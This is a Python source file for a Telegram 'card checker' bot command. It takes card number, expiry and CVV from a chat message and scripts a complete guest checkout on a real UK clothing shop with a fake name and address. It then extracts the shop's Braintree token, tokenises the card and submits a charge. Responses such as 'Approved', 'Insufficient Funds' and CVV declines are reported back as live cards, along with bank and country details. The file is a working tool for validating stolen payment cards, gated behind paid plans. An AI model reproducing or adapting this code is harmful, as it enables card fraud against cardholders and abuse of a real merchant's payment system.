import requests
import base64
from configs.datos import *
from datetime import datetime


@abigail('chk')
async def cr(_, msg):
            start = time.time()
            await msg.reply_chat_action(enums.ChatAction.TYPING)
            v = collection.find_one({"_id": msg.from_user.id})
            if v is None: return await msg.reply(text='<b>hey!, you are not registered, use the command <code>!register</code></b>',quote=True)
    
            if v["role"] == "ban":
              return await msg.reply('<i>User from banned Bot!</i>',quote=True)
    
    
            po = collection_tres.find_one({"group": str(msg.chat.id)})

            if v['key'] != 'None' or po != None:
                if v['key'] != 'None':
                   if v["key"] < datetime.now():            
                    collection.update_one({"_id": msg.from_user.id},{"$set": {"key": 'None'}})
                    collection.update_one({"_id": msg.from_user.id},{"$set": {"antispam": 50}})
                    collection.update_one({"_id": msg.from_user.id},{"$set": {"plan": 'Free'}})
                   return await msg.reply(text='<b>Key Expired! ❌</b>',quote=True)
            elif po["key"] < datetime.now():
                   collection_tres.delete_one({"group": str(msg.chat.id)})

            else: return await msg.reply(text='<i>Hello, this group or chat is not authorized for the use of this bot.</i>',quote=True)

            data = msg.text.split(" ", 2)

            if len(data) < 2:
                await msg.reply_text("<i>Invalid Card </i>",quote=True)
                return

            ccs  = data[1]
            card = ccs.split("|")
            cc   = card[0]
            if not cc:
                await msg.reply_text("<i>Invalid Card</i>",quote=True)
                return
            mes  = card[1]
            if not mes:
                await msg.reply_text("<i>Invalid Card</i>",quote=True)
                return
            ano  = card[2]
            if not ano:
                await msg.reply_text("<i>Invalid Card</i>",quote=True)
                return
            cvv  = card[3]
            if not cvv:
                await msg.reply_text("<i>Invalid Card</i>",quote=True)
                return
            bin_code = cc[:6]
            low_ano = lambda x: x[2:] if len(x) == 4 else x
            ano = low_ano(ano)
            x = get_bin_info(bin_code)
            vendor = x.get("vendor")  
            typea = x.get("type")  
            level = x.get("level")
            bank = x.get("bank_name")
            country = x.get("country")
            flag = x.get("flag")
            msg1 = await msg.reply(f"""<b><i>Starting!<i>
<code>{cc}|{mes}|{ano}|{cvv}</code>
{vendor} {typea} {level} {flag}</b>""",quote=True)

            session = requests.Session()


            headers = {
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Accept-Language': 'es-419,es;q=0.5',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'Cookie': 'PHPSESSID=ci5546umv0khbod2bgp455b7i3; language=en; currency=GBP; tmr_vid_5756=1',
    'Origin': 'https://10poundtees.co.uk',
    'Referer': 'https://10poundtees.co.uk/worlds-silliest-goose',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-GPC': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Chromium";v="118", "Brave";v="118", "Not=A?Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    }

            data = {
    'option[9734]': '117741',
    'option[9733]': '113310',
    'option[9735]': '113328',
    'quantity': '1',
    'product_id': '3130',
    }

            response = session.post(
    'https://10poundtees.co.uk/index.php?route=checkout/cart/add',
    headers=headers,
    data=data,
    )


            headers = {
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Accept-Language': 'es-419,es;q=0.5',
    'Connection': 'keep-alive',
    # 'Content-Length': '0',
    # 'Cookie': 'PHPSESSID=ci5546umv0khbod2bgp455b7i3; language=en; currency=GBP; tmr_vid_5756=1',
    'Origin': 'https://10poundtees.co.uk',
    'Referer': 'https://10poundtees.co.uk/worlds-silliest-goose',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-GPC': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Chromium";v="118", "Brave";v="118", "Not=A?Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    }

            response = session.post(
    'https://10poundtees.co.uk/index.php?route=module/klaviyo/added_to_cart&product_id=3130&quantity=1',
    headers=headers,
    )

            headers = {
    'Accept': 'text/html, */*; q=0.01',
    'Accept-Language': 'es-419,es;q=0.5',
    'Connection': 'keep-alive',
    # 'Cookie': 'PHPSESSID=ci5546umv0khbod2bgp455b7i3; language=en; currency=GBP; tmr_vid_5756=1',
    'Referer': 'https://10poundtees.co.uk/worlds-silliest-goose',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-GPC': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Chromium";v="118", "Brave";v="118", "Not=A?Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    }

            response = session.get('https://10poundtees.co.uk/index.php?route=common/cart/info', headers=headers)



            headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'Accept-Language': 'es-419,es;q=0.5',
    'Connection': 'keep-alive',
    # 'Cookie': 'PHPSESSID=ci5546umv0khbod2bgp455b7i3; language=en; currency=GBP; tmr_vid_5756=1; language=en_US; amazon-pay-connectedAuth=connectedAuth_general',
    'Referer': 'https://10poundtees.co.uk/checkout/cart',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Sec-GPC': '1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Chromium";v="118", "Brave";v="118", "Not=A?Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    }

            response = session.get('https://10poundtees.co.uk/quickcheckout/checkout', headers=headers)



            headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'Accept-Language': 'es-419,es;q=0.5',
    'Connection': 'keep-alive',
    # 'Cookie': 'PHPSESSID=ci5546umv0khbod2bgp455b7i3; language=en; currency=GBP; tmr_vid_5756=1; language=en_US; amazon-pay-connectedAuth=connectedAuth_general; apay-session-set=Uns57ueplxhMAwGn5gQ8yDmzyzY%2Ft2uwOEbdG221rEoDJoQsxU1mSfT1fQrrXR0%3D',
    'Referer': 'https://10poundtees.co.uk/checkout/cart',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Sec-GPC': '1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Chromium";v="118", "Brave";v="118", "Not=A?Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    }

            response = session.get('https://10poundtees.co.uk/checkout/checkout', headers=headers)



            headers = {
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Accept-Language': 'es-419,es;q=0.5',
    'Connection': 'keep-alive',
    # 'Content-Length': '0',
    # 'Cookie': 'PHPSESSID=ci5546umv0khbod2bgp455b7i3; language=en; currency=GBP; tmr_vid_5756=1; language=en_US; amazon-pay-connectedAuth=connectedAuth_general; apay-session-set=Uns57ueplxhMAwGn5gQ8yDmzyzY%2Ft2uwOEbdG221rEoDJoQsxU1mSfT1fQrrXR0%3D',
    'Origin': 'https://10poundtees.co.uk',
    'Referer': 'https://10poundtees.co.uk/checkout/checkout',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-GPC': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Chromium";v="118", "Brave";v="118", "Not=A?Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    }

            response = session.post(
    'https://10poundtees.co.uk/index.php?route=module/klaviyo/started_checkout',
    headers=headers,
    )

            headers = {
    'Accept': 'text/html, */*; q=0.01',
    'Accept-Language': 'es-419,es;q=0.5',
    'Connection': 'keep-alive',
    # 'Cookie': 'PHPSESSID=ci5546umv0khbod2bgp455b7i3; language=en; currency=GBP; tmr_vid_5756=1; language=en_US; amazon-pay-connectedAuth=connectedAuth_general; apay-session-set=Uns57ueplxhMAwGn5gQ8yDmzyzY%2Ft2uwOEbdG221rEoDJoQsxU1mSfT1fQrrXR0%3D',
    'Referer': 'https://10poundtees.co.uk/checkout/checkout',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-GPC': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Chromium";v="118", "Brave";v="118", "Not=A?Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    }

            response = session.get('https://10poundtees.co.uk/index.php?route=checkout/guest', headers=headers)



            headers = {
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Accept-Language': 'es-419,es;q=0.5',
    'Connection': 'keep-alive',
    # 'Cookie': 'PHPSESSID=ci5546umv0khbod2bgp455b7i3; language=en; currency=GBP; tmr_vid_5756=1; language=en_US; amazon-pay-connectedAuth=connectedAuth_general; apay-session-set=Uns57ueplxhMAwGn5gQ8yDmzyzY%2Ft2uwOEbdG221rEoDJoQsxU1mSfT1fQrrXR0%3D',
    'Referer': 'https://10poundtees.co.uk/checkout/checkout',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-GPC': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Chromium";v="118", "Brave";v="118", "Not=A?Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    }

            response = session.get(
    'https://10poundtees.co.uk/index.php?route=checkout/checkout/country&country_id=223',
    headers=headers,
    )


            headers = {
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Accept-Language': 'es-419,es;q=0.5',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'Cookie': 'PHPSESSID=ci5546umv0khbod2bgp455b7i3; language=en; currency=GBP; tmr_vid_5756=1; language=en_US; amazon-pay-connectedAuth=connectedAuth_general; apay-session-set=Uns57ueplxhMAwGn5gQ8yDmzyzY%2Ft2uwOEbdG221rEoDJoQsxU1mSfT1fQrrXR0%3D',
    'Origin': 'https://10poundtees.co.uk',
    'Referer': 'https://10poundtees.co.uk/checkout/checkout',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-GPC': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Chromium";v="118", "Brave";v="118", "Not=A?Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    }

            data = {
    'customer_group_id': '1',
    'firstname': 'Juan',
    'lastname': 'Perez',
    'email': 'pepeg93f0f4@gmail.com',
    'telephone': '070 3007 4426',
    'fax': '',
    'company': '',
    'address_1': '93 Argyll Road',
    'address_2': '',
    'city': 'Llanddowror',
    'postcode': 'SA33 4YF',
    'country_id': '222',
    'zone_id': '3563',
    'shipping_address': '1',
    }

            response = session.post(
    'https://10poundtees.co.uk/index.php?route=checkout/guest/save',
    headers=headers,
    data=data,
    )

            headers = {
    'Accept': 'text/html, */*; q=0.01',
    'Accept-Language': 'es-419,es;q=0.5',
    'Connection': 'keep-alive',
    # 'Cookie': 'PHPSESSID=aun6ferbinmipbh48i99r8kpa6; language=en; currency=GBP; tmr_vid_5756=1; language=en_US; amazon-pay-connectedAuth=connectedAuth_general; apay-session-set=mTvOB0O8CvxNobO5M1YGZV%2BpCyAk6nIuwpsZ6ie8F%2FOZ4fY6fNyKkayfWrkO%2F3A%3D',
    'Referer': 'https://10poundtees.co.uk/checkout/checkout',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-GPC': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Chromium";v="118", "Brave";v="118", "Not=A?Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    }

            response = session.get('https://10poundtees.co.uk/index.php?route=checkout/shipping_method', headers=headers)


            headers = {
    'Accept': 'text/html, */*; q=0.01',
    'Accept-Language': 'es-419,es;q=0.5',
    'Connection': 'keep-alive',
    # 'Cookie': 'PHPSESSID=aun6ferbinmipbh48i99r8kpa6; language=en; currency=GBP; tmr_vid_5756=1; language=en_US; amazon-pay-connectedAuth=connectedAuth_general; apay-session-set=mTvOB0O8CvxNobO5M1YGZV%2BpCyAk6nIuwpsZ6ie8F%2FOZ4fY6fNyKkayfWrkO%2F3A%3D',
    'Referer': 'https://10poundtees.co.uk/checkout/checkout',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-GPC': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Chromium";v="118", "Brave";v="118", "Not=A?Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    }

            response = session.get('https://10poundtees.co.uk/index.php?route=checkout/guest_shipping', headers=headers)


            headers = {
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Accept-Language': 'es-419,es;q=0.5',
    'Connection': 'keep-alive',
    # 'Cookie': 'PHPSESSID=aun6ferbinmipbh48i99r8kpa6; language=en; currency=GBP; tmr_vid_5756=1; language=en_US; amazon-pay-connectedAuth=connectedAuth_general; apay-session-set=mTvOB0O8CvxNobO5M1YGZV%2BpCyAk6nIuwpsZ6ie8F%2FOZ4fY6fNyKkayfWrkO%2F3A%3D',
    'Referer': 'https://10poundtees.co.uk/checkout/checkout',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-GPC': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Chromium";v="118", "Brave";v="118", "Not=A?Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    }

            response = session.get(
    'https://10poundtees.co.uk/index.php?route=checkout/checkout/country&country_id=222',
    headers=headers,
    )


            headers = {
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Accept-Language': 'es-419,es;q=0.5',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'Cookie': 'PHPSESSID=ci5546umv0khbod2bgp455b7i3; language=en; currency=GBP; tmr_vid_5756=1; language=en_US; amazon-pay-connectedAuth=connectedAuth_general; apay-session-set=Uns57ueplxhMAwGn5gQ8yDmzyzY%2Ft2uwOEbdG221rEoDJoQsxU1mSfT1fQrrXR0%3D',
    'Origin': 'https://10poundtees.co.uk',
    'Referer': 'https://10poundtees.co.uk/checkout/checkout',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-GPC': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Chromium";v="118", "Brave";v="118", "Not=A?Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    }

            data = {
    'shipping_method': 'ocaaspro.ocaaspro_18',
    'comment': '',
    }

            response = session.post(
    'https://10poundtees.co.uk/index.php?route=checkout/shipping_method/save',
    headers=headers,
    data=data,
    )
            with open('B31.html', 'w', encoding='utf-8') as f:
             f.write(response.text)

            headers = {
    'Accept': 'text/html, */*; q=0.01',
    'Accept-Language': 'es-419,es;q=0.5',
    'Connection': 'keep-alive',
    # 'Cookie': 'PHPSESSID=aun6ferbinmipbh48i99r8kpa6; language=en; currency=GBP; tmr_vid_5756=1; language=en_US; amazon-pay-connectedAuth=connectedAuth_general; apay-session-set=mTvOB0O8CvxNobO5M1YGZV%2BpCyAk6nIuwpsZ6ie8F%2FOZ4fY6fNyKkayfWrkO%2F3A%3D',
    'Referer': 'https://10poundtees.co.uk/checkout/checkout',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-GPC': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Chromium";v="118", "Brave";v="118", "Not=A?Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    }

            response = session.get('https://10poundtees.co.uk/index.php?route=checkout/payment_method', headers=headers)


            headers = {
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Accept-Language': 'es-419,es;q=0.5',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'Cookie': 'PHPSESSID=ci5546umv0khbod2bgp455b7i3; language=en; currency=GBP; tmr_vid_5756=1; language=en_US; amazon-pay-connectedAuth=connectedAuth_general; apay-session-set=Uns57ueplxhMAwGn5gQ8yDmzyzY%2Ft2uwOEbdG221rEoDJoQsxU1mSfT1fQrrXR0%3D',
    'Origin': 'https://10poundtees.co.uk',
    'Referer': 'https://10poundtees.co.uk/checkout/checkout',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-GPC': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Chromium";v="118", "Brave";v="118", "Not=A?Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    }

            data = {
    'payment_method': 'braintree',
    'comment': '',
    }

            response = session.post(
    'https://10poundtees.co.uk/index.php?route=checkout/payment_method/save',
    headers=headers,
    data=data,
    )

            headers = {
    'Accept': 'text/html, */*; q=0.01',
    'Accept-Language': 'es-419,es;q=0.5',
    'Connection': 'keep-alive',
    # 'Cookie': 'PHPSESSID=aun6ferbinmipbh48i99r8kpa6; language=en; currency=GBP; tmr_vid_5756=1; language=en_US; amazon-pay-connectedAuth=connectedAuth_general; apay-session-set=mTvOB0O8CvxNobO5M1YGZV%2BpCyAk6nIuwpsZ6ie8F%2FOZ4fY6fNyKkayfWrkO%2F3A%3D',
    'Referer': 'https://10poundtees.co.uk/checkout/checkout',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-GPC': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Chromium";v="118", "Brave";v="118", "Not=A?Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    }

            response = session.get('https://10poundtees.co.uk/index.php?route=checkout/confirm', headers=headers)

            with open('B3.html', 'w', encoding='utf-8') as f:
             f.write(response.text)

            bearer = response.text.split("authorization: '")[1].split("'")[0]
            beare = base64.b64decode(bearer).decode()

            bearer1 = beare.split('"authorizationFingerprint":"')[1].split('"')[0]


            headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'es-419,es;q=0.5',
    'authorization': f'Bearer {bearer1}',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Chromium";v="118", "Brave";v="118", "Not=A?Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'sec-gpc': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    }

            json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'dropin2',
        'sessionId': '79630233-d199-4591-9a57-59bfb3683903',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': cc,
                'expirationMonth': mes,
                'expirationYear': ano,
                'cvv': cvv,
                'billingAddress': {
                    'postalCode': '10080',
                },
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
    }

            response = session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
            nonce = response.json()['data']['tokenizeCreditCard']['token']

            headers = {
    'Accept': '*/*',
    'Accept-Language': 'es-419,es;q=0.5',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'Cookie': 'PHPSESSID=ci5546umv0khbod2bgp455b7i3; language=en; currency=GBP; tmr_vid_5756=1; language=en_US; amazon-pay-connectedAuth=connectedAuth_general; apay-session-set=Uns57ueplxhMAwGn5gQ8yDmzyzY%2Ft2uwOEbdG221rEoDJoQsxU1mSfT1fQrrXR0%3D',
    'Origin': 'https://10poundtees.co.uk',
    'Referer': 'https://10poundtees.co.uk/checkout/checkout',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-GPC': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Chromium";v="118", "Brave";v="118", "Not=A?Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    }

            data = {
    'nonce': nonce,
    'device_data': '{"device_session_id":"684668db5ee84439c3c0eea5017f1307","fraud_merchant_id":null}',
    }

            response = session.post(
    'https://10poundtees.co.uk/index.php?route=extension/payment/braintree/chargeNonce',
    headers=headers,
    data=data,
    ) 
            stop = time.time()
            tiempo = str(start - stop)[1:5]
            print(response.text)


            if "Card Issuer Declined CVV" in response.text:
             await msg1.edit(f'''<b>
<code>{cc}|{mes}|{ano}|{cvv}</code>
Status : <code>Approved! 🟩</code>
Response : <code>Card Issuer Declined CVV</code>
━━━━━ Bin Info ━━━━━                        
{vendor} {typea} {level} 
{country} {flag}
━━━━━━━━ 
time: {tiempo}
By: @{msg.from_user.username} | [{v['plan']}]
</b>''')
            
            elif "Insufficient Funds" in response.text:
             await msg1.edit(f'''<b>
<code>{cc}|{mes}|{ano}|{cvv}</code>
Status : <code>Approved! 🟩</code>
Response : <code>Insufficient Funds</code>
━━━━━ Bin Info ━━━━━                        
{vendor} {typea} {level} 
{country} {flag}
━━━━━━━━ 
time: {tiempo}
By: @{msg.from_user.username} | [{v['plan']}]
</b>''')
            
            elif "1000:Approved" in response.text:
             await msg1.edit(f'''<b>
<code>{cc}|{mes}|{ano}|{cvv}</code>
Status : <code>Approved! 🟩</code>
Response : <code>1000:Approved</code>
━━━━━ Bin Info ━━━━━                        
{vendor} {typea} {level} 
{country} {flag}
━━━━━━━━ 
time: {tiempo}
By: @{msg.from_user.username} | [{v['plan']}]
</b>''')
            
            else:
              await msg1.edit(f'''<b>
<code>{cc}|{mes}|{ano}|{cvv}</code>
Status : <code>Declined! ❌</code>
Response : <code>{response.text}</code>
━━━━━ Bin Info ━━━━━                        
{vendor} {typea} {level} 
{country} {flag}
━━━━━━━━ 
time: {tiempo}
By: @{msg.from_user.username} | [{v['plan']}]
</b>''')
            
            